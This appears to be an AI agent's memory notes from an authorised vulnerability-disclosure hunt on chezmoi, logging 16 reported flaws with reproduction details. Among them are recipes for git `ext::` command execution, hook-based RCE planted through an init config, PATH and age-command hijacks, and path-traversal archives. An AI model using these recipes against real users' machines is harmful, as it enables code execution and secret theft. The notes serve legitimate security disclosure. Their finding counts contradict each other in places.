---
name: project-chezmoi
description: "chezmoi (dotfiles manager) hunt on Secur0 — 9 findings submitted incl. arbitrary local file exfiltration via chezmoi init alone (#9, report 3320), archive path traversal/git RCE/debug log leak/symlink escape/decompression bomb/incomplete-fix-#2889/Windows backslash traversal/world-readable decrypt output; 2 weaker candidates correctly parked after user pushback, source-code-only audit methodology"
metadata: 
  node_type: memory
  type: project
  originSessionId: f642df8e-9597-40f7-9730-20014b373e01
---

Hunt started 2026-07-24 on Secur0, program "chezmoi" (CVE-eligible VDP, safe harbor), scope https://github.com/twpayne/chezmoi, only in-scope asset. All 3 findings below were SUBMITTED to Secur0 on 2026-07-24 (confirmed by user) — this hunt is closed pending triage response, not actively worked further unless the user reopens it.

**Methodology**: pure source-code audit + local PoC against a self-compiled binary (same pattern as [[project_edgepython]]) — no live web app, "target" is the CLI tool itself. Cloned repo, built with `go build` (Go 1.24 installed locally works fine even though go.mod requests 1.26).

**Finding #1 — ready to submit**: Path traversal (Zip/Tar-Slip, CWE-22) in `internal/chezmoi/archive.go`'s `walkArchiveTar`/`walkArchiveRar` — unlike `walkArchiveZip`, they don't validate entry names against `../` traversal. Reaches `readExternalArchive()` in `sourcestate.go`, which extracts `type = "archive"` externals (`.chezmoiexternal.toml`) directly into the destination tree during normal `chezmoi apply`/`update`. Confirmed with a working PoC: a crafted `.tar.gz` with a single entry named `../../attacker_target/.bashrc` made `chezmoi apply --force` write a file completely outside the simulated `$HOME`. Checksum verification (optional in chezmoi) doesn't help — it only pins the archive bytes, not the internal entry names. Secondary, lower-severity variant: same unsanitized `WalkArchive` reached via `chezmoi import` panics (crash/DoS) instead of escaping, because that path (`ArchiveReaderSystem`) happens to call `MustTrimDirPrefix` which panics on escape rather than writing. Full report drafted at `findings/chezmoi-archive-path-traversal/secur0-report.md`, evidence (malicious tar.gz + config) saved alongside. No prior GitHub security advisory or issue found for this — looks novel.

**Why**: chezmoi is a large, actively used Go CLI with no live web surface, so the entire engagement is source review + local exploitation, same shape as edge-python.

**Finding #2 — ready to submit, more severe**: RCE (Critical, ~9.0-9.3) in `type = "git-repo"` externals. `sourcestate.go:1287-1345` builds `git clone`/`git pull` argv directly from unsanitized `external.URL`/`external.Clone.Args`/`external.Pull.Args` (all attacker-controlled via `.chezmoiexternal.toml`). git 2.53 blocks the `ext::` transport helper by default, but `Clone.Args = ["--config=protocol.ext.allow=always"]` combined with `url = "ext::<command>"` re-enables it for that single invocation and executes arbitrary local commands during normal `chezmoi apply`. Confirmed first with raw git (isolate the git-level bug), then end-to-end against the compiled chezmoi binary. Note: the naive `--upload-pack=<cmd>` variant (as the whole `url`) does NOT work in chezmoi's real flow, because the only positional git has left is `destAbsPath`, which doesn't exist yet on first apply — git fails with "repository does not exist" before invoking upload-pack. Only the `ext::` + `protocol.ext.allow=always` combo works. This is a genuinely different root cause from finding #1 (argument injection into a git subprocess vs. missing path-traversal validation in an archive extractor) — reported separately per [[feedback_report_merge_rule]].

**Finding #3 — ready to submit**: Sensitive-data-in-logs (Medium-High, ~6.0-6.9, CWE-532) — `chezmoi --debug` logs the full raw stdout of every subprocess via `chezmoilog.LogCmdOutput`/`LogCmdCombinedOutput`/`LogCmdRun` (internal/chezmoilog/chezmoilog.go), with no redaction. All 16 secret-manager template-function integrations (bitwarden, onepassword, lastpass, keepassxc, keeper, dashlane, doppler, gopass, pass, protonpass, rbw, vault, passhole, keyring, bitwarden-secrets, generic "secret") route through this same wrapper. Confirmed end-to-end with a mocked `bw` CLI: both the Bitwarden session token (`bw unlock --raw` output) and the actual retrieved secret value appear in cleartext in the `--debug` log. Confirmed as a negative control that plain `--verbose` (no `--debug`) does NOT leak it — strictly gated behind `--debug`, which is exactly the flag chezmoi's own troubleshooting docs recommend users pass when reporting problems (no warning given). Side note for the fix: `OSExecCmdLogValuer` has a method typo (`LogValuer()` instead of the slog-required `LogValue()`) that accidentally prevents an even-worse `cmd.Env` leak (Bitwarden/KeePassXC put session tokens in `cmd.Env`) — flagged in the report so a future typo-fix doesn't reopen a bigger hole without also adding redaction.

**How to apply**: when resuming this hunt, check `findings/chezmoi-archive-path-traversal/submission-notes.md`, `findings/chezmoi-gitrepo-external-rce/submission-notes.md`, and `findings/chezmoi-debug-secret-leak/submission-notes.md` first. Follow-up not yet done: the `type = "archive-file"` variant in `readExternalArchiveFile`, sourcestate.go:2634, shares finding #1's root cause but wasn't separately PoC'd — don't make it a third report, it folds into #1's fix. All 3 current findings have distinct root causes (missing path-traversal validation / git argv injection / unredacted debug logging) — none should be merged per [[feedback_report_merge_rule]].

## Session 2026-07-25: 4th finding — symlink escape, distinct root cause, wider format scope

Resumed the hunt (findings #1-3 already submitted/closed). Tested two new hypotheses first,
both DISPROVEN with real PoCs: (a) symlink-then-write-through-it in the same/next `apply` —
blocked by chezmoi's generic "inconsistent state" conflict check and by safe reconciliation
(stale symlink deleted before new tree is written); (b) auto-exec of `run_*`-named files
smuggled in via an external — impossible by design, externals always build `TargetStateFile`,
never `TargetStateScript`.

**Finding #4 — new, ready to submit**: Symlink Escape (CWE-59), High (~7.0-7.5). Root cause
is DISTINCT from finding #1 (which was about unsanitized entry *names*): none of the three
archive walkers (`archive.go`) validate `linkname` (the symlink *target*) before it reaches
`TargetStateSymlink` in `readExternalArchive`/`readExternalArchiveFile`. Critically, this
affects **ZIP too** — finding #1 reported zip as safe because it validates entry names, but
it never checks the symlink target content, so it's a second, independent gap in the exact
same function. Confirmed end-to-end: a 272-byte crafted zip with one symlink entry pointing
to an absolute path outside the simulated `$HOME`, delivered via `type = "archive-file"`,
made `chezmoi apply --force` create a live symlink — then `cat` through that symlink
successfully read real content from outside the destination tree in a single apply. RAR is
NOT affected via this path (`walkArchiveRar` always passes `linkname=""`, doesn't propagate
rar symlinks at all) — noted explicitly to scope the report precisely. Full report at
`findings/chezmoi-archive-symlink-escape/report_secur0.md`, evidence (272-byte payload.zip +
exact `.chezmoiexternal.toml`) in `evidence/`.

**Why this wasn't already covered**: finding #1's own "fix suggestion" section already
speculated symlinks might have the same problem, but that was never built/confirmed at the
time — this session turned that hypothesis into an actual working exploit, which also
revealed it's *broader* than speculated (zip included, not just tar/rar).

**How to apply next**: this is a 4th, separate report (different unvalidated field,
broader format scope than #1) — not a merge into the already-closed #1 per
[[feedback_report_merge_rule]]. **UPDATE 2026-07-31: confirmed by user this 4th finding
(and all other chezmoi findings) is now SUBMITTED — all 4 chezmoi reports are sent.** If
resuming further: `type = "archive"` (full-tree) symlink creation also confirmed possible
(Phase 1 of testing), just didn't yield an additional write-through primitive beyond what
archive-file already demonstrates — no need to re-test that path again.

## Session 2026-07-31: 5th finding — decompression bomb, real end-to-end pipeline test

Used chezmoi as the live test subject for the new Secur0 API automation pipeline
(`tools/secur0_api.py` + `secur0_watch_and_hunt.sh`, see the [[MEMORY]] pipeline notes from
this session). Found a genuinely new root cause distinct from findings #1-4: neither the
external's HTTP download (`getExternalDataRaw`, `io.ReadAll(resp.Body)`) nor per-entry archive
extraction (`readExternalArchive`, `io.ReadAll(r)` for every regular file) enforces any size
limit anywhere. Classic decompression-bomb / CWE-409.

**Finding #5 — SUBMITTED for real via the API pipeline (report_id 3108, 2026-07-31)**:
built a 6-line Python generator producing a 509,694-byte tar.gz (single all-zeros entry
declared as 500MB), served it over a local HTTP server exactly like a real external fetch,
pointed a `.chezmoiexternal.toml` `type = "archive"` at it, ran `chezmoi apply --force`
against the compiled binary from commit `ba5a19a2`. Measured real peak RSS via
`/proc/<pid>/status` polling: **~1.24 GB** from a <1MB download, plus a genuine 500MB file
written to disk, exit code 0, no warning. ~2,500:1 memory amplification from this modest,
safely-repeatable demo value; documented (not run, to avoid risking the sandbox) that real
decompression-bomb ratios of 1,000,000:1+ are routine, meaning tens-of-GB targets are
trivially reachable from a similarly small archive. Report at
`findings/chezmoi-archive-decompression-bomb-dos/report_secur0.md`.

**Pipeline validation note**: this was the first real, live, end-to-end use of
`tools/secur0_api.py submit` — confirmed `get_program_details` (no auth) → `sign_guidelines`
(gracefully handled the "already signed" case, which fired since this account had already
engaged with chezmoi before) → `parse_report_markdown` → `create_report`, all worked
correctly against production. Full credit: this validates the automation pipeline built
2026-07-31, not just the finding itself.

## Session 2026-08-01: 6th finding — a prior "Fixed" report was never actually fixed

User pasted the closed-report detail page for #2889 (a `parseDirAttr` dot-resolution bug —
`exact_literal_.` source dir resolves to `TargetName: "."`, so a normal `chezmoi apply` treats
the whole destination root as `exact_`-managed and silently deletes every unmanaged file in
it), which the maintainer had marked "Arreglado" citing commit `01b60ddec` ("Disallow filenames
that resolve to ."). Re-audited the actual current code before trusting the closure:
`01b60ddec` only patches `parseFileAttr`; `git log --oneline --all -- internal/chezmoi/attr.go`
shows no commit after it ever touches `parseDirAttr` (the function #2889 actually named as
vulnerable). Re-fetched `origin` fresh and re-ran the original report's own two tests
(`TestParseDirAttrAllowsNameResolvingToDot`, `TestExactDirResolvingToDotDeletesUnmanagedHomeContents`)
against the live tip (`bbf3c4102`, dated 2026-08-01) — both still report `VULNERABLE`/`PASS`.

**Finding #6 — SUBMITTED (report_id 3307, 2026-08-01)**: `findings/dia2/chezmoi-parsedirattr-dot-fix-incomplete/report_secur0.md`.
Not a new vulnerability — it documents that #2889's closure was incorrect (fixed the sibling
function, not the one actually named), with the exact same repro still working on current
master. CVSS kept at the SAME Medio (5.7)-equivalent rating as #2889 (`UI:A`, not `UI:N` — the
original draft used `UI:N` and scored much higher until self-corrected: the trigger requires
the victim to actively clone+apply a specific attacker-authored repo, that's Active user
interaction, not driveby). #2889 itself is locked for comments, hence the separate report
rather than trying to reopen it.

**Lesson**: when a target program shows you a "Fixed" status on a report you didn't originally
write up, don't take the closure at face value if the fix commit is cheap to check — `git log
--all -- <file>` immediately showed the cited commit never touched the actually-vulnerable
function. Worth doing this check reflexively whenever a user pastes a "Fixed"/"Resuelto" report
for review, not just when something seems off.

## Session 2026-08-02: 2 more findings — draft reports from a prior, unrecorded session

User said "de chezmoi se ha aceptado mas, prueba a mirar si hay actualizaciones." Fetched
origin (new tip `370ed2fd1`, one formatting commit past `bbf3c4102`) and, while investigating,
discovered `findings/dia2/` already contained THREE unsubmitted draft reports from an earlier
session that never got recorded in this memory file at all (a real memory gap, not just
staleness): `chezmoi-archive-backslash-traversal-windows`, `chezmoi-decrypt-output-world-readable`,
and `chezmoi-exact-dir-dot-deletes-home-contents`. Independently re-derived the backslash-traversal
bug from scratch (same root cause, same Go-stdlib citation) before finding the pre-existing draft —
strong cross-validation.

**Finding #7 SUBMITTED (report_id 3318, 2026-08-02): backslash based path traversal bypasses the
brand-new archive guard, Windows only.** `NewUntrustedRelPath` (`internal/chezmoi/relpath.go`,
hardened days earlier by `ba5a19a2f` against `/..`-suffix) only ever checks forward-slash `..`
patterns; it never considers `\`. Since Windows (confirmed by reading `os/path_windows.go`'s
`IsPathSeparator` directly: "Windows accepts / as path separator" — implying `\` is the primary
one) treats `\` as a real separator, and `AbsPath.Join` (`abspath.go:68`) uses `filepath.Join`
(GOOS-aware, unlike `RelPath.Join` which uses the forward-slash-only `path` package), a tar/zip/rar
entry named e.g. `..\..\..\Users\Public\evil.txt` sails through validation and would escape the
destination directory once actually joined and written on a Windows build. Live-verified on this
Linux box (the validator-bypass and WalkArchive-propagation parts are pure string logic, platform
independent); the final OS-level join was reasoned from Go's own committed stdlib source, not
executed on a real Windows host (none available) — report is explicit about this split. Same
`archive.go` entry points as findings #1/#4 but a genuinely new root cause (separator-blindness in
the shared validator, not a missing traversal check or unvalidated symlink target).

**Finding #8 SUBMITTED (report_id 3319, 2026-08-02): decrypt/cat/diff/archive/execute-template
--output write decrypted secrets world-readable.** `Config.writeOutput`/`writeOutputString`
(`internal/cmd/config.go:3129`) takes the perm from its caller with no minimum-privacy floor of its
own. The maintainer already fixed this exact class (`0o666`→`0o600`) for `secret keyring get`
(`840f68213`) and `age-keygen` (`f7282b812`) — and, notably, landed TWO MORE permission-hardening
fixes in this same campaign just yesterday (`0ad679a83` tightens `externalDiffFile`'s temp dir to
`0o700`, `4031be13e` sets `fscache.WithUmask(0o077)` on the HTTP cache dir) — but never touched the
5 call sites that route the most sensitive content of all (actually-decrypted secrets/password-
manager output) through the same `0o666` default: `decryptcmd.go`'s `filterInput`, `catcmd.go`,
`config.go:2311` (`pageDiffOutput`), `archivecmd.go`, `executetemplatecmd.go`. Confirmed live
against the current tip (`370ed2fd1`, re-verified fresh today, not just against the older commit
the draft was originally written against): with umask 022, the resulting file is 644. Extremely
topical timing — the maintainer is actively hardening exactly this bug class right now.

**Draft NOT submitted — correctly identified as obsolete/superseded**:
`chezmoi-exact-dir-dot-deletes-home-contents` is the SAME underlying bug as pre-existing dashboard
report #2889 ("Directory attribute parser missing dot-resolution guard lets a source dir wipe
HOME" — near-verbatim title match), which by the time this was rediscovered had already been
superseded by finding #6 (`chezmoi-parsedirattr-dot-fix-incomplete`, report_id 3307, submitted
2026-08-01 — the "the cited fix commit never touched the actually-vulnerable function" report).
Submitting this draft now would be a pure duplicate; left as-is in `findings/dia2/`, not sent.

**Process note for future sessions**: `findings/dia2/`/`findings/dia3/` etc. can silently
accumulate DRAFT reports across sessions that this memory file never recorded — when resuming a
hunt on any program, it's worth a quick `find findings -ipath "*<program>*"` sweep before assuming
memory's finding list is complete, not just trusting the numbered "Finding #N" narrative here.

## Session 2026-08-02 continued: 2 parked (weak), 1 severe new finding (#9)

User pushed back hard on two candidates found via the "check recent fixes for gaps" method after
the initial 2 (#7/#8) landed — asked "pero esto no seria informativo? el unico daño seria a mi?"
— exactly the right question, and correct: both capped at low-medium impact once actually
stress-tested, so neither was submitted:
- **Parked: `format-indent-width` template directive memory bomb.** `76e2ddf60` fixed a crash on
  *negative* width (`strings.Repeat` panics) but never added an upper bound — live-verified
  `# chezmoi:template:format-indent-width=2000000000` allocates ~1.77 GB RSS from a ~50-byte
  line. Real bug, but purely transient (memory freed on exit/crash, no persistent artifact, no
  multi-user blast radius since chezmoi isn't a shared server process) — correctly judged too
  weak to submit as-is.
- **Parked: persistent-state-directory permission fix (`e7cbe71ab`) is a no-op.** TWO separate
  `MkdirAll(..., fs.ModePerm)` calls (`internal/cmd/config.go:911` in `chezmoi init`, and
  `internal/chezmoi/boltpersistentstate.go:230` in `BoltPersistentState.open()`, which runs on
  EVERY state operation) both create `~/.config/chezmoi/` with 0o777-before-umask, and since
  `os.MkdirAll` no-ops on an already-existing directory, the "fixed" `0o700` path
  (`boltpersistentstate.go:57`, only reachable from bbolt's own lazy `OpenFile`) never actually
  fires in real usage. Live-verified in a FULLY isolated env (see incident note below) — dir ends
  up `755`. Real "fix doesn't work" bug, but capped low-medium: the DB file and config.toml are
  both still individually `0600`, so only directory listing/metadata leaks, and only if outer
  `$HOME` is also permissive (not the default on modern distros). Correctly not submitted.

**Incident, disclosed to and accepted by the user:** an early isolated-environment test only
overrode `$HOME`, not `$XDG_CONFIG_HOME` — which was still inherited from the outer shell
pointing at the REAL `/home/diego/.config`. This caused chezmoi to write one real, live test
entry into the user's actual `~/.config/chezmoi/chezmoistate.boltdb` (pre-existing file from
2026-07-31, not created by me — birth time confirmed via `stat`, only modified). Disclosed
immediately, user said leave it (harmless — just an entryState bucket entry for a nonexistent
test path). **Lesson: full env isolation for chezmoi local testing needs `$HOME` AND
`$XDG_CONFIG_HOME`/`$XDG_CACHE_HOME`/`$XDG_DATA_HOME`/`$XDG_STATE_HOME` all overridden together**
— `$HOME` alone is not enough since chezmoi (correctly) prefers explicit XDG env vars when set.

## Session 2026-08-06: 10th finding — fresh bug in code merged same day, zero prior researcher exposure

User explicitly asked to look for something DIFFERENT from the well-trodden "everyone reports
this" bug classes (archive traversal / git-repo RCE / etc — the security.md credits commit
`f81cb3217` lists 7+ other researchers, several with "multiple vulnerabilities," confirming this
program is heavily hunted). Pivoted to checking brand-new commits instead of re-verifying old
findings' fix status (which the user also explicitly declined). Found commit `1e51cc5d88e` (same
day as the credits commit) adding `shellQuote`/`shellQuoteList` template functions — a NEW
security-hardening helper ("returns *string* quoted for POSIX shells," worked example embeds
`$untrustedArg`), already adopted in the project's own `install-init-shell.sh.tmpl`.

**Finding #10 SUBMITTED (report_id 3753, 2026-08-06): `shellQuote` silently doubles any
backslash in its input, breaking its own POSIX-quoting guarantee.** Root cause:
`internal/cmd/shellquote.go`'s backslash case never closes the open single-quoted region before
emitting `\\`, unlike the sibling single-quote case which correctly does close/escape/reopen —
but backslash needs NO special handling at all inside POSIX single quotes (100% literal), so the
whole branch is wrong. Verified empirically, not just by reading: extracted the exact function
into a standalone Go binary, round-tripped through a real `/bin/sh`. Targeted breakout attempts
(`\'; touch PWNED; echo \'` etc.) confirmed NO shell injection is possible — single-quote
handling itself is correct. But 3000-case random fuzz found 660 round-trip mismatches, 100%
attributable to backslash, 0% to any other metacharacter — clean single root cause. The
project's own unit test encodes the bug's output as "correct" (string-equality against a
hardcoded value, never round-tripped through an actual shell), which is why `go test` passes
despite the defect. Proposed and verified a one-branch-removed fix: 0/3000 mismatches. Scored
honestly as Low (CVSS `VI:L` only) — real impact is silent corruption of secrets/paths/passwords
containing a backslash when embedded via the documented pattern, not privilege escalation.

**Lesson for future sessions on heavily-hunted CVE targets**: once a program has many
researchers finding the same well-known bug classes, the highest-signal move is checking commits
merged in the last 0-2 days for brand-new, zero-prior-exposure code — especially anything
billed as a security fix/hardening helper — rather than re-treading old ground or re-verifying
already-submitted findings' fix status (which the user considers a separate, lower-priority
activity from actually finding new things).

## Session 2026-08-06 continued: 11th finding — higher severity, symlink + remove-list combo

User asked to keep looking but for higher severity ("seguro que hay un montón de tonterías").
Pivoted from fresh-commit-diffing to combining two independently-ordinary, already-existing
chezmoi features nobody had connected: `symlink_<name>` source entries (create a real symlink
anywhere, including outside the destination tree — legitimate on its own) and `.chezmoiremove`
(wildcard delete list, validated only against `..`-traversal strings via `NewUntrustedRelPath`,
which has nothing to catch here since no `..` is ever used).

**Finding #11 SUBMITTED (report_id 3756, 2026-08-06): a self-referencing symlink plus a
`.chezmoiremove` wildcard recursively deletes an entire directory outside the destination
tree.** Built chezmoi from source (`go build`, commit `370ed2fd1`, Go 1.26 now installed and
matches go.mod exactly). `TargetStateRemove.Apply()` (targetstateentry.go:303) calls
`system.RemoveAll()` with no symlink-awareness at all — unlike the archive extractors elsewhere
in this codebase, which do reject symlinks before writing. Live-verified in full env isolation:
symlink `link` -> an external `canarydir` (3 files across nested subdirs), first apply creates
the symlink normally, second apply with `.chezmoiremove` containing `link/*` + `link/**/*`
recursively deletes EVERY file under `canarydir` — confirmed via `find` showing zero files
remaining, directory itself untouched. One precondition, confirmed via a negative control: the
symlink must already exist on disk (a single virgin apply with both files present from the start
does NOT trigger it, since `.chezmoiremove`'s glob walks real on-disk state built before that
same apply's writes) — but "apply/update run twice" is completely ordinary chezmoi usage
(`chezmoi update` on cron/shell-rc is a documented common pattern), not a contrived precondition.
A `link/**` pattern that also matches "link" itself gets caught by chezmoi's OWN generic
inconsistent-state conflict check (nice existing defense, noted honestly in the report) — but
that check doesn't extend to contents reachable *through* the symlink, only to the symlink path
itself, so `link/*` + `link/**/*` sails through. CVSS `AV:L/AC:L/AT:N/PR:N/UI:P/VA:H` (pure
availability/destruction impact, no confidentiality/integrity-of-other-data angle) — higher
practical severity than finding #10 (the shellQuote bug) since it's a self-contained, no-archive-
needed, full recursive delete primitive using only two everyday chezmoi features.

**Lesson**: after exhausting "check what changed recently," the next-highest-signal move on a
mature target is cross-feature composition — take two independently well-tested, individually-
safe features and ask whether anyone validated the COMBINATION, not just each one alone. Neither
`symlink_` nor `.chezmoiremove` is a bug by itself; nobody had connected what happens when a
remove-list glob is asked to walk through a symlink the same source state manages.

**Negative-result verification (same session)**: tested whether the same "RemoveAll doesn't
check symlinks" gap extends to normal file writes or `exact_` directories through a pre-existing
symlink at the same path — both are SAFE, because chezmoi's normal apply reconciliation tracks
its own previously-managed entries and cleanly deletes-then-recreates the stale symlink before
writing, unlike `.chezmoiremove`'s raw glob-match-against-live-filesystem path which has no such
tracking. Confirms finding #11 is narrowly scoped to `.chezmoiremove`, not systemic — useful to
know if the maintainer's fix location needs pinning down precisely.

## Session 2026-08-06 continued: 12th finding — CRITICAL, direct RCE via init hooks, most severe on this target

User asked specifically to look at `run_` scripts and hooks. `run_` scripts turned out to be
well-defended (hash-keyed by SHA-256 for once/onchange tracking, no obvious bypass found in a
quick pass). Hooks were the payoff.

**Finding #12 SUBMITTED (report_id 3758, 2026-08-06): a plain `.chezmoi.toml.tmpl` (config
template) gives immediate, unconditional arbitrary command execution via `hooks.apply.post`,
using `chezmoi init --apply` alone — chezmoi's own documented one-line quick-start command.**
Root cause: `createAndReloadConfigFile()` (initcmd.go:223) parses the init source's
`.chezmoi.toml.tmpl` and immediately loads the result as LIVE config (including the `Hooks` map)
before the user has approved/applied anything else; `runInitCmd` then unconditionally calls
`c.runHookPre("apply")`/`c.runHookPost("apply")` (initcmd.go:237/249) using that just-loaded,
attacker-supplied config when `--apply` is set. Live-verified: a `.chezmoi.toml.tmpl` containing
ONLY a static `[hooks.apply.post] command = "/bin/sh" args = [...]` TOML table (zero suspicious
template function calls — no include/getRedirectedURL/exec, nothing a diff-reviewer would flag)
ran `id`/`whoami` with the real user's full privileges via a single `chezmoi init --apply
<repo>`. **More severe than finding #9** (which needed chained template functions for file-
read+exfil) since this is direct unconditional command execution requiring nothing suspicious in
the template at all. **Also persistent, not one-shot**: `createAndReloadConfigFile` always
writes `.chezmoi.toml` regardless of `--apply`, so even a "cautious" bare `chezmoi init` (no
apply) plants the hook; it then fires on every LATER ordinary `chezmoi apply` via the generic
`c.runHookPre(cmd.Name())`/`c.runHookPost(cmd.Name())` mechanism (config.go:2690/2372), AND
`hooks.read-source-state` (cmd.go:24, fired from config.go:2118, the shared source-state-loading
path used by nearly every command) means even read-only commands like `chezmoi status`/`diff` —
exactly what a cautious user would run to preview an untrusted repo first — re-trigger it too.
CVSS `AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H` — full C/I/A impact, the most severe finding on
this entire target across 3 sessions, worse even than the original git-repo-external RCE (#2)
since it needs no `.chezmoiexternal.toml` at all, just the plainest possible init config.

**Lesson**: "config that gets silently trusted and acted upon the moment it's generated by an
untrusted source" is a distinct and often more severe class than "template functions that read/
exfiltrate data" — worth checking on any tool where an untrusted source can populate the tool's
OWN live configuration (not just managed output files) during first-run setup. Hooks especially:
any feature that maps a config-declared command to automatic execution on ordinary, frequently-
run commands (not just the one-time setup action) turns a single init into a persistent backdoor.

## Session 2026-08-06 continued: 13th finding — same root cause class, silent credential theft variant

Followed the hooks finding's "init config trusted immediately" theme to its logical next
question: what OTHER config fields does `.chezmoi.toml.tmpl` control that are just as dangerous
as hooks? Found `age.command`/`age.useBuiltin` — `useBuiltinAgeAutoFunc()` (config.go:3113)
prefers an EXTERNAL `age` binary whenever `LookPath(c.Age.Command)` succeeds, and
`AgeEncryption.Decrypt`/`Encrypt`/etc (ageencryption.go:35-91) shell out to `e.Command` via
`exec.Command` whenever builtin isn't used.

**Finding #13 SUBMITTED (report_id 3759, 2026-08-06): init config can silently redirect every
future secret decryption to an attacker-chosen binary — a silent, persistent credential-theft
primitive, distinct from and arguably more dangerous than #12's RCE.** PoC: `.chezmoi.toml.tmpl`
sets `[age] command = "<path>" useBuiltin = false` (static config, zero suspicious template
functions) + an ordinary `run_once_` script plants a fake executable at that path. First
`init --apply` plants config+binary (had to structure this as config-load-then-later-decrypt,
NOT same-pass, since `useBuiltinAgeAutoFunc()` resolves once at config load time, BEFORE that
same apply's `run_once_` scripts run — confirmed empirically: decrypting an encrypted file
present from the start of the same init still uses safe builtin since the fake binary doesn't
exist yet at that exact moment; a LATER, separate `chezmoi apply`/`cat` — e.g. the victim
managing a real secret sometime after initial setup — is what actually triggers the hijack).
Live-verified: fake binary received the real `--decrypt --identity <path>` args a genuine `age`
would get. A competent malicious wrapper would transparently forward to real `age` after
exfiltrating the plaintext, leaving ZERO visible error — unlike #12's hooks RCE, which at least
runs visibly. Noted (not individually re-tested) that `Git.Command`/`Diff.Command`/
`Edit.Command`/password-manager command defaults share the identical `LookPath`-based trust
pattern, so the same class of attack likely extends there too. CVSS `VC:H` only (pure
confidentiality impact, no I/A) — scored differently from #12 to reflect the narrower but more
insidious real-world consequence.

**Lesson**: once one instance of a vulnerability class is found ("init config X is trusted
blindly"), systematically enumerate every OTHER config field with equivalent power (any field
naming an external command/binary path is a candidate) rather than stopping at the first
instance — this session found 2 structurally-related but practically very different-severity
findings (#12 loud RCE, #13 silent credential theft) from the exact same root cause by asking
"what else can .chezmoi.toml.tmpl poison?" after the first one landed.

## Session 2026-08-06 continued: 14th finding — the same family, but single-pass and universal

Kept enumerating "what else can `.chezmoi.toml.tmpl` poison" after #12/#13. Found `[env]`/
`[scriptEnv]` (`config.go:2902`, `setEnvironmentVariables()`) — calls raw `os.Setenv()` on every
key, including `PATH`, with only a cosmetic warning for `CHEZMOI_`-prefixed keys. Called early in
config setup, well before script execution.

**Finding #14 SUBMITTED (report_id 3760, 2026-08-06): a single `chezmoi init --apply` hijacks
PATH for every bare-name command any run_ script (or chezmoi itself) invokes for the rest of
that same invocation.** This is meaningfully WORSE in practicality than #12/#13: those both
needed a `run_once_`-planted binary from a PRIOR apply because the relevant decision (which hook
to run / builtin-vs-external age) resolves once at a point before that same pass's `run_once_`
scripts run — but `PATH` poisoning via `os.Setenv` takes effect immediately, so a single ordinary
`chezmoi init --apply` with a `run_once_setup-git.sh` script that just runs `git --version`
(a completely unremarkable line) was enough — live-verified, fake `git` invoked with real args,
all in one command. Also broader: doesn't need `hooks` or any chezmoi-specific command-config
field at all — it hijacks EVERY bare-name subprocess at once, generalizing #13's `age.command`
finding (chezmoi's own `git`/`age` LookPath-based resolution goes through the same poisoned PATH)
without touching those fields directly. CVSS same as #12 (`VC:H/VI:H/VA:H`, full impact) but
scored as the most immediately practical of the three since it needs no second invocation.

**Session summary**: 5 new findings this session (2026-08-06) beyond the original 9 from prior
sessions: #10 (3753, Low, shellQuote backslash corruption — brand-new code, zero prior
researcher exposure, unrelated family), #11 (3756, High, symlink + .chezmoiremove wildcard
recursive delete, unrelated family), then a 3-report "init config trust" family — #12 (3758,
Critical, direct persistent RCE via init hooks, most severe on this target across all sessions),
#13 (3759, silent persistent credential theft via age.command hijack), #14 (3760, single-pass
universal PATH hijack, most practically severe of the family) — all three explicitly
cross-referenced in their own reports as related-but-distinct (different specific mechanism,
different fix location, different consequence) rather than merged, per
[[feedback_report_merge_rule]]. Total now 14 findings submitted on chezmoi. If resuming: the
"init config trust" family likely has more instances (any config field naming a
command/path/search-variable is a candidate — Git.Command/Diff.Command/Edit.Command and the
password-manager command defaults were NOTED but not individually re-tested) — diminishing
distinctiveness the more are found, so worth checking with the user before submitting a 4th
variant in the same family rather than assuming more automatically warrant separate reports.

## Session 2026-08-06 continued: 15th finding — same family, destructive-target variant, with an honest mitigation caveat

User explicitly said not to worry about informational-only findings but gave broad license
("mira lo que consideres, o que me salga duplicado por el mismo fix") — kept going but pivoted
away from more command/PATH-hijack variants toward a destructive-target variant instead.

**Finding #15 SUBMITTED (report_id 3761, 2026-08-06): `cacheDir` config setting redirects
`chezmoi purge` to recursively delete an arbitrary directory.** `doPurge()`
(purgecmd.go) queues `c.CacheDirAbsPath` (an ordinary, directly config-controllable field — no
symlink trick, no template functions, just `cacheDir = "<any path>"` in `.chezmoi.toml.tmpl`)
for `RemoveAll`, with zero validation it's actually under `$XDG_CACHE_HOME` or any
chezmoi-expected location. Live-verified: a "victim-documents" dir with real files outside the
managed tree was completely wiped by `chezmoi purge --force` (silent, no path even printed in
force mode). **Important honest caveat, unlike #12/#13/#14**: `purge` WITHOUT `--force` shows a
real, specific `Remove <exact path>?` confirmation prompt per path (confirmed the exact prompt
text) — this is NOT a silent/unconditional primitive, it needs either `--force` (common/
documented for scripted cleanup) or a user confirming without reading. Reported with that
mitigation explicitly disclosed rather than overstated — CVSS `VA:H` only, UI:P scoped
specifically to the `--force` scenario.

**Lesson**: when continuing to mine the same vulnerability family, actively look for the
variant that ALSO has a genuine, different mitigating control (not just genuinely different
mechanism/impact) — reporting it honestly (severity reflects the real bypass path, not the
worst case) is more credible and more likely to be valued than another unconditional-primitive
claim that would just get bucketed with the rest.

## Session 2026-08-06 continued: 16th finding — genuinely different, no malicious repo needed at all

User kept pushing ("sigue mirando de chezmoi") after the "config trust" family and permission
sweep both came back dry. Pivoted hard away from "malicious repo" threat model entirely and
asked: what happens to chezmoi's OWN decrypted-secret temp files on interruption? Grepped the
whole codebase for `signal.Notify`/`os/signal` — zero hits, chezmoi installs no signal handler
at all.

**Finding #16 SUBMITTED (report_id 3767, 2026-08-06): decrypted secrets are left in a temp file
when `edit-encrypted` is terminated instead of exiting normally — no malicious repo, no attacker
config, pure ordinary use.** `editencryptedcmd.go` decrypts to `c.tempDir("chezmoi-edit-
encrypted")`, launches `$EDITOR`, and only cleans up via `Config.Close()`, itself only ever
invoked through a single `defer` in `cmd.go:214` — skipped by anything but a normal return.
Live-verified with a REAL age identity generated via chezmoi's own builtin `age-keygen` (no
external age binary needed) and a real encrypted round-trip: `/proc/<pid>/status` showed
**SIGINT is flat-out ignored** (Ctrl-C does nothing at all while editing) and **SIGTERM is
"caught" but doesn't run cleanup** — sent SIGTERM, process died, temp dir with the cleartext
secret ("SECRET-VALUE-abc123-TOP-SECRET-PASSWORD") was still there and still readable
afterward. Confirmed the identical `tempDir→decrypt→launch external tool→defer-only-cleanup`
shape also exists in `mergecmd.go` (chezmoi-merge-plaintext), `editcmd.go` (plain `edit` on
encrypted files), and KeePassXC integration — not individually re-tested, same root cause.
